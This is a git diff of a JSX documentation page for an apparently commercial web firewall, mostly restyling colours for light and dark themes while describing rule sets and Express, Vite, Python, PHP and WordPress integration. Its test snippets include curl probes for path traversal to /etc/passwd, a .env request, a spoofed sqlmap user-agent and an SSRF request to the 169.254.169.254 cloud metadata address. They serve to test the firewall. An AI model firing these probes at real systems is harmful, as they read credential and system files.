+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#d97706', fontSize: '12px', fontWeight: '700' }}>250 Compiled Signatures</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Directory Traversal &amp; LFI (250 Rules)</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Directory Traversal &amp; LFI (250 Rules)</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Prevents attackers from escaping web root directories to read sensitive configuration files, system credentials, or database keys.
               </p>
               <CodeBlock language="bash" code={`# Test LFI / Path Traversal:
@@ -921,11 +968,11 @@ curl -i "http://localhost:5000/api/books?id=../../../../etc/passwd"`} />
           {activeSection === 'cms-vulnerabilities' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>300 Compiled Signatures</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>300 Compiled Signatures</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>CMS Exploits &amp; Framework Vulnerabilities</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
-                Dedicated rules for WordPress plugin exploits, Laravel <code>.env</code> key exposure, Log4Shell (<code>${'${'}jndi:ldap...{'}'}</code>), and Spring4Shell CVEs.
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>CMS Exploits &amp; Framework Vulnerabilities</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
+                Dedicated rules for WordPress plugin exploits, Laravel <code className="doc-inline-code">.env</code> key exposure, Log4Shell (<code className="doc-inline-code">${'${'}jndi:ldap...{'}'}</code>), and Spring4Shell CVEs.
               </p>
               <CodeBlock language="bash" code={`# Test CMS Exploit Block:
 curl -i "http://localhost:5000/.env"`} />
@@ -936,10 +983,10 @@ curl -i "http://localhost:5000/.env"`} />
           {activeSection === 'bots-scanners' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#fbbf24', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#d97706', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Bots &amp; Vulnerability Scanners (200 Rules)</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Bots &amp; Vulnerability Scanners (200 Rules)</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Identifies automated probing tools (sqlmap, Nikto, Acunetix, DirBuster, WPScan, Gobuster) and immediately terminates connection before reconnaissance completes.
               </p>
               <CodeBlock language="bash" code={`# Test Scanner Interception:
@@ -951,11 +998,11 @@ curl -i -H "User-Agent: sqlmap/1.6#stable" "http://localhost:5000/api/books"`} /
           {activeSection === 'ssrf-xxe' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>SSRF &amp; XXE Protection (200 Rules)</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
-                Blocks Server-Side Request Forgery against cloud metadata instances (<code>169.254.169.254</code>) and XML External Entity injection.
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>SSRF &amp; XXE Protection (200 Rules)</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
+                Blocks Server-Side Request Forgery against cloud metadata instances (<code className="doc-inline-code">169.254.169.254</code>) and XML External Entity injection.
               </p>
               <CodeBlock language="bash" code={`# Test SSRF Cloud Metadata Probe:
 curl -i "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-data/"`} />
@@ -971,7 +1018,7 @@ curl -i "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-
                   borderRadius: '20px',
                   background: 'rgba(59, 130, 246, 0.15)',
                   border: '1px solid rgba(59, 130, 246, 0.3)',
-                  color: '#60a5fa',
+                  color: dark ? '#60a5fa' : '#2563eb',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Official npm Package</span>
@@ -980,51 +1027,53 @@ curl -i "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-
                   borderRadius: '20px',
                   background: 'rgba(16, 185, 129, 0.15)',
                   border: '1px solid rgba(16, 185, 129, 0.3)',
-                  color: '#34d399',
+                  color: '#059669',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Zero External Dependencies</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Node.js &amp; Express Integration</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
-                Protect your Node.js, Express, or Next.js backend with <code>mdefender-pro</code>. When you install the package, our high-performance cyber-styled <strong>403 Block Page</strong> is automatically bundled &mdash; simply add your API key to activate real-time threat defense.
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Node.js &amp; Express Integration</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
+                Protect your Node.js, Express, or Next.js backend with <code className="doc-inline-code">mdefender-pro</code>. When you install the package, our high-performance cyber-styled <strong>403 Block Page</strong> is automatically bundled &mdash; simply add your API key to activate real-time threat defense.
               </p>
 
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '28px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
-                  <i className="fa-solid fa-1" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '16px' }}>
+                  <i className="fa-solid fa-1" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Install the NPM Package
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
                   Run this in your website backend directory:
                 </p>
                 <CodeBlock language="bash" code={`npm install mdefender-pro`} />
               </div>
 
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '28px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
-                  <i className="fa-solid fa-2" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '16px' }}>
+                  <i className="fa-solid fa-2" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Initialize Configuration via CLI
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
                   Run our 1-click interactive CLI generator to configure your API key and options:
                 </p>
                 <CodeBlock language="bash" code={`npx mdefender-pro init`} />
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '12px' }}>
-                  Or manually create <code>mdefender.config.js</code> in your project root:
+                <p style={{ fontSize: '13px', color: t.muted, marginTop: '12px' }}>
+                  Or manually create <code className="doc-inline-code">mdefender.config.js</code> in your project root:
                 </p>
                 <CodeBlock
                   language="javascript"
@@ -1055,18 +1104,19 @@ module.exports = {
               </div>
 
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '28px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
-                  <i className="fa-solid fa-3" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '16px' }}>
+                  <i className="fa-solid fa-3" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Attach WAF Middleware to Express
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
-                  Place <code>mdefender()</code> right after body parsers (<code>express.json()</code>) and before your application routes:
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
+                  Place <code className="doc-inline-code">mdefender()</code> right after body parsers (<code className="doc-inline-code">express.json()</code>) and before your application routes:
                 </p>
                 <CodeBlock
                   language="javascript"
@@ -1106,7 +1156,7 @@ app.listen(5000, () => {
                   borderRadius: '20px',
                   background: 'rgba(56, 189, 248, 0.15)',
                   border: '1px solid rgba(56, 189, 248, 0.3)',
-                  color: '#38bdf8',
+                  color: t.accentText,
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Frontend &amp; Single Page Apps</span>
@@ -1115,49 +1165,51 @@ app.listen(5000, () => {
                   borderRadius: '20px',
                   background: 'rgba(16, 185, 129, 0.15)',
                   border: '1px solid rgba(16, 185, 129, 0.3)',
-                  color: '#34d399',
+                  color: '#059669',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>0ms Client Shield + Vite Server Plugin</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>React / Vite / SPA Frontend Integration</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>React / Vite / SPA Frontend Integration</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Protect Single Page Applications built with <strong>React, Vite, Vue, Svelte, or Next.js</strong>. MDefender Pro provides <strong>dual-layer frontend protection</strong>: client-side 0ms DOM/URL/Fetch protection and Vite dev/preview server 403 network blocking.
               </p>
 
               {/* Step 1: Install */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '28px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
-                  <i className="fa-solid fa-1" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '16px' }}>
+                  <i className="fa-solid fa-1" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Install the NPM Package
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
-                  Install <code>mdefender-pro</code> in your frontend project:
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
+                  Install <code className="doc-inline-code">mdefender-pro</code> in your frontend project:
                 </p>
                 <CodeBlock language="bash" code={`npm install mdefender-pro`} />
               </div>
 
               {/* Step 2: Client SPA Protection */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '28px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
-                  <i className="fa-solid fa-2" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
-                  Initialize Client Guard in <code>main.jsx</code> / <code>index.jsx</code>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '16px' }}>
+                  <i className="fa-solid fa-2" style={{ color: t.accentText, marginRight: '10px' }}></i>
+                  Initialize Client Guard in <code className="doc-inline-code">main.jsx</code> / <code className="doc-inline-code">index.jsx</code>
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
-                  Call <code>initWaf()</code> at the very top of your application entry point:
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
+                  Call <code className="doc-inline-code">initWaf()</code> at the very top of your application entry point:
                 </p>
                 <CodeBlock
                   language="javascript"
@@ -1182,27 +1234,28 @@ ReactDOM.createRoot(document.getElementById('root')).render(
   </React.StrictMode>
 );`}
                 />
-                <div style={{ padding: '12px 16px', borderRadius: '8px', background: 'rgba(37,99,235,0.1)', border: '1px solid rgba(59,130,246,0.3)', marginTop: '14px' }}>
-                  <p style={{ margin: 0, fontSize: '12.5px', color: '#93c5fd', lineHeight: '1.6' }}>
-                    <strong>What <code>initWaf()</code> protects:</strong> Automatically intercepts malicious URL query parameters (XSS, LFI, SQLi), outgoing <code>fetch</code> &amp; <code>axios</code> payloads, and swaps the DOM with the 403 Security Screen while dispatching real-time incident telemetry to your dashboard.
+                <div style={{ padding: '12px 16px', borderRadius: '8px', background: dark ? 'rgba(37,99,235,0.1)' : '#eff6ff', border: dark ? '1px solid rgba(59,130,246,0.3)' : '1px solid #bfdbfe', marginTop: '14px' }}>
+                  <p style={{ margin: 0, fontSize: '12.5px', color: dark ? '#93c5fd' : '#1d4ed8', lineHeight: '1.6' }}>
+                    <strong>What <code className="doc-inline-code">initWaf()</code> protects:</strong> Automatically intercepts malicious URL query parameters (XSS, LFI, SQLi), outgoing <code className="doc-inline-code">fetch</code> &amp; <code className="doc-inline-code">axios</code> payloads, and swaps the DOM with the 403 Security Screen while dispatching real-time incident telemetry to your dashboard.
                   </p>
                 </div>
               </div>
 
               {/* Step 3: Vite Server Plugin */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '28px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
-                  <i className="fa-solid fa-3" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
-                  Add the Vite Server Plugin in <code>vite.config.js</code>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '16px' }}>
+                  <i className="fa-solid fa-3" style={{ color: t.accentText, marginRight: '10px' }}></i>
+                  Add the Vite Server Plugin in <code className="doc-inline-code">vite.config.js</code>
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
-                  Add <code>mdefenderVite</code> to your plugins so Vite returns a real <code>HTTP 403 Forbidden</code> status code over the network:
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
+                  Add <code className="doc-inline-code">mdefenderVite</code> to your plugins so Vite returns a real <code className="doc-inline-code">HTTP 403 Forbidden</code> status code over the network:
                 </p>
                 <CodeBlock
                   language="javascript"
@@ -1244,7 +1297,7 @@ export default defineConfig({
                   borderRadius: '20px',
                   background: 'linear-gradient(135deg, rgba(37,99,235,0.2), rgba(124,58,237,0.2))',
                   border: '1px solid rgba(59, 130, 246, 0.4)',
-                  color: '#60a5fa',
+                  color: dark ? '#60a5fa' : '#2563eb',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Full-Stack Architecture</span>
@@ -1253,48 +1306,49 @@ export default defineConfig({
                   borderRadius: '20px',
                   background: 'rgba(16, 185, 129, 0.15)',
                   border: '1px solid rgba(16, 185, 129, 0.3)',
-                  color: '#34d399',
+                  color: '#059669',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Backend + Frontend Unified Defense</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Connecting Full-Stack Web Projects</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Connecting Full-Stack Web Projects</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 For modern applications with a separate <strong>Backend API (e.g. Express on Port 4000)</strong> and <strong>Frontend SPA (e.g. React/Vite on Port 5173)</strong>, connect both sides using the same API Key for complete end-to-end telemetry and defense.
               </p>
 
               <div style={{
-                background: '#0a0e1a',
-                border: '1px solid #1e293b',
+                background: t.cardBgAlt,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '28px'
               }}>
-                <h3 style={{ fontSize: '16px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
-                  <i className="fa-solid fa-diagram-project" style={{ color: '#38bdf8', marginRight: '8px' }}></i>
+                <h3 style={{ fontSize: '16px', fontWeight: '800', color: t.subheading, marginBottom: '16px' }}>
+                  <i className="fa-solid fa-diagram-project" style={{ color: t.accentText, marginRight: '8px' }}></i>
                   Unified Full-Stack Protection Flow
                 </h3>
                 <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
-                  <div style={{ background: '#0f172a', padding: '18px', borderRadius: '10px', border: '1px solid #334155' }}>
-                    <div style={{ color: '#38bdf8', fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>
+                  <div style={{ background: dark ? '#0f172a' : '#f8fafc', padding: '18px', borderRadius: '10px', border: t.cardBorder }}>
+                    <div style={{ color: t.accentText, fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>
                       <i className="fab fa-react" style={{ marginRight: '6px' }}></i> Frontend Layer (Port 5173)
                     </div>
-                    <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.8' }}>
-                      <li><code>mdefenderVite</code> in <code>vite.config.js</code></li>
-                      <li><code>initWaf()</code> in <code>main.jsx</code></li>
+                    <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '12.5px', color: t.muted, lineHeight: '1.8' }}>
+                      <li><code className="doc-inline-code">mdefenderVite</code> in <code className="doc-inline-code">vite.config.js</code></li>
+                      <li><code className="doc-inline-code">initWaf()</code> in <code className="doc-inline-code">main.jsx</code></li>
                       <li>Blocks direct URL/DOM attacks with 403 block page</li>
                       <li>Captures client telemetry to MDefender Cloud</li>
                     </ul>
                   </div>
 
-                  <div style={{ background: '#0f172a', padding: '18px', borderRadius: '10px', border: '1px solid #334155' }}>
-                    <div style={{ color: '#10b981', fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>
+                  <div style={{ background: dark ? '#0f172a' : '#f8fafc', padding: '18px', borderRadius: '10px', border: t.cardBorder }}>
+                    <div style={{ color: '#059669', fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>
                       <i className="fab fa-node-js" style={{ marginRight: '6px' }}></i> Backend Layer (Port 4000)
                     </div>
-                    <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.8' }}>
-                      <li><code>app.use(mdefender())</code> in <code>index.js</code></li>
-                      <li>Inspects API endpoints (<code>/api/books</code>, <code>/api/users</code>)</li>
+                    <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '12.5px', color: t.muted, lineHeight: '1.8' }}>
+                      <li><code className="doc-inline-code">app.use(mdefender())</code> in <code className="doc-inline-code">index.js</code></li>
+                      <li>Inspects API endpoints (<code className="doc-inline-code">/api/books</code>, <code className="doc-inline-code">/api/users</code>)</li>
                       <li>Blocks SQLi, RCE, and payload attacks with 403 status</li>
                       <li>Streams telemetry to user dashboard</li>
                     </ul>
@@ -1308,15 +1362,15 @@ export default defineConfig({
           {activeSection === 'sdk-python' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(59, 130, 246, 0.15)', border: '1px solid rgba(59, 130, 246, 0.3)', color: '#60a5fa', fontSize: '12px', fontWeight: '700' }}>Python SDK</span>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>FastAPI &bull; Django &bull; Flask</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(59, 130, 246, 0.15)', border: '1px solid rgba(59, 130, 246, 0.3)', color: dark ? '#60a5fa' : '#2563eb', fontSize: '12px', fontWeight: '700' }}>Python SDK</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>FastAPI &bull; Django &bull; Flask</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Python / FastAPI / Django Integration</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Python / FastAPI / Django Integration</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Protect any Python web application using MDefender ASGI / WSGI middleware.
               </p>
 
-              <h3 style={{ fontSize: '17px', fontWeight: '700', color: '#38bdf8', marginBottom: '10px' }}>FastAPI ASGI Middleware</h3>
+              <h3 style={{ fontSize: '17px', fontWeight: '700', color: t.accentText, marginBottom: '10px' }}>FastAPI ASGI Middleware</h3>
               <CodeBlock
                 language="python"
                 code={`from fastapi import FastAPI, Request
@@ -1363,15 +1417,15 @@ app.add_middleware(MDefenderFastAPIMiddleware)`}
           {activeSection === 'sdk-php' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(99, 102, 241, 0.15)', border: '1px solid rgba(99, 102, 241, 0.3)', color: '#818cf8', fontSize: '12px', fontWeight: '700' }}>PHP 7.4 - 8.3</span>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>Laravel Middleware Ready</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(99, 102, 241, 0.15)', border: '1px solid rgba(99, 102, 241, 0.3)', color: '#7c3aed', fontSize: '12px', fontWeight: '700' }}>PHP 7.4 - 8.3</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>Laravel Middleware Ready</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>PHP &amp; Laravel Integration</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>PHP &amp; Laravel Integration</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Integrate MDefender Pro WAF into any standalone PHP script or Laravel framework middleware.
               </p>
 
-              <h3 style={{ fontSize: '17px', fontWeight: '700', color: '#38bdf8', marginBottom: '10px' }}>Laravel Middleware (<code>app/Http/Middleware/MDefenderWaf.php</code>)</h3>
+              <h3 style={{ fontSize: '17px', fontWeight: '700', color: t.accentText, marginBottom: '10px' }}>Laravel Middleware (<code className="doc-inline-code">app/Http/Middleware/MDefenderWaf.php</code>)</h3>
               <CodeBlock
                 language="php"
                 code={`<?php
@@ -1422,7 +1476,7 @@ class MDefenderWaf
                   borderRadius: '20px',
                   background: 'rgba(59, 130, 246, 0.15)',
                   border: '1px solid rgba(59, 130, 246, 0.3)',
-                  color: '#60a5fa',
+                  color: dark ? '#60a5fa' : '#2563eb',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Official WP Plugin</span>
@@ -1431,24 +1485,25 @@ class MDefenderWaf
                   borderRadius: '20px',
                   background: 'rgba(16, 185, 129, 0.15)',
                   border: '1px solid rgba(16, 185, 129, 0.3)',
-                  color: '#34d399',
+                  color: '#059669',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>ML WAF + Malware Scanner</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>WordPress Plugin &amp; ML Cloud Security</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>WordPress Plugin &amp; ML Cloud Security</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Protect any WordPress site with the official <strong>MDefender Pro Security Plugin</strong>. It integrates your WordPress site directly with our <strong>5,489,242+ Dataset Machine Learning Core</strong> for real-time WAF request blocking and deep malware scanning.
               </p>
 
               {/* Download Plugin Action Card */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(37, 99, 235, 0.15), rgba(124, 58, 237, 0.15))',
-                border: '1px solid rgba(59, 130, 246, 0.4)',
+                background: dark ? 'linear-gradient(135deg, rgba(37, 99, 235, 0.15), rgba(124, 58, 237, 0.15))' : '#ffffff',
+                border: dark ? '1px solid rgba(59, 130, 246, 0.4)' : '1px solid #bfdbfe',
                 borderRadius: '16px',
                 padding: '24px 28px',
                 marginBottom: '28px',
+                boxShadow: t.cardShadow,
                 display: 'flex',
                 alignItems: 'center',
                 justifyContent: 'space-between',
@@ -1456,11 +1511,11 @@ class MDefenderWaf
                 gap: '16px'
               }}>
                 <div>
-                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#ffffff', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '8px' }}>
-                    <i className="fab fa-wordpress" style={{ color: '#38bdf8' }}></i> Download MDefender Pro Plugin
+                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.heading, marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <i className="fab fa-wordpress" style={{ color: t.accentText }}></i> Download MDefender Pro Plugin
                   </h3>
-                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0 }}>
-                    Latest Release: <code>v4.1.0</code> &bull; PHP 7.4 - 8.3 &bull; WordPress 5.8+ Compatible
+                  <p style={{ fontSize: '13px', color: t.muted, margin: 0 }}>
+                    Latest Release: <code className="doc-inline-code">v4.1.0</code> &bull; PHP 7.4 - 8.3 &bull; WordPress 5.8+ Compatible
                   </p>
                 </div>
                 <a
@@ -1472,7 +1527,7 @@ class MDefenderWaf
                     gap: '8px',
                     padding: '12px 24px',
                     borderRadius: '10px',
-                    background: 'linear-gradient(135deg, #2563eb, #7c3aed)',
+                    background: t.primaryGrad,
                     color: '#ffffff',
                     fontSize: '14px',
                     fontWeight: '700',
@@ -1486,25 +1541,26 @@ class MDefenderWaf
 
               {/* Step by step installation */}
               <div style={{
